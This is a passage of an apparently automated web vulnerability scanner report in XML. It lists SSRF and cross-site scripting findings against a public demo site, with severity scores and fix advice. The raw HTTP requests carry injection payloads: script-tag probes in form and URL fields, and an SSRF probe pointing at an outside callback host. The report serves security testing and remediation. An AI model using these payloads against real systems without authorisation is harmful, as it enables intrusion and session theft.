          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="34" color="red">
       <Name><![CDATA[Server side request forgery]]></Name>
       <ModuleName><![CDATA[Scripting (Server_Side_Request_Forgery.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">http://hitGA41G5ADsB.bxss.me/</font></b><br/><br/>An HTTP request was initiated for the domain <b>hitGA41G5ADsB.bxss.me </b> which indicates that this script is vulnerable to SSRF (Server Side Request Forgery).<br/><br/>HTTP request details: <br/><pre wrap="virtual">IP address: 176.28.50.165
User agent: </pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[The impact varies according to the affected server interface.]]></Impact>
       <Description><![CDATA[SSRF as in Server Side Request Forgery is a vulnerability that allows an attacker to force server interfaces into sending packets initiated by the victim server to the local interface or to another server behind the firewall. Consult Web References for more information about this problem.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should properly sanitize user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://hitGA41G5ADsB.bxss.me/&amp;size=160 HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:54 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 1891
]]></Response>
       </TechnicalDetails>
       <CWE id="918"><![CDATA[CWE-918]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[5.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H]]></Descriptor>
          <Score><![CDATA[9]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[High]]></A>
          <Adesc><![CDATA[There is total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed).]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[SSRF VS. BUSINESS-CRITICAL APPLICATIONS]]></Database>
          <URL><![CDATA[https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="35" color="orange">
       <Name><![CDATA[Cross site scripting (content-sniffing)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">./pictures/7.jpg'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;Oz3E(9485)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This type of XSS can only be triggered on (and affects) content sniffing browsers.</font></div><br/>This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=./pictures/7.jpg'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;Oz3E(9485)&lt;/ScRiPt&gt;&amp;size=160 HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:57 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 413
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="36" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">name</font></b> was set to <b><font color="dark">anonymous%20user'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;njp2(9297)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/guestbook.php]]></Affects>
       <Parameter><![CDATA[name]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /guestbook.php HTTP/1.1
Content-Length: 96
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

submit=add%20message&amp;name=anonymous%2520user'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;njp2(9297)&lt;/ScRiPt&gt;&amp;text=1]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:09 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4587
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
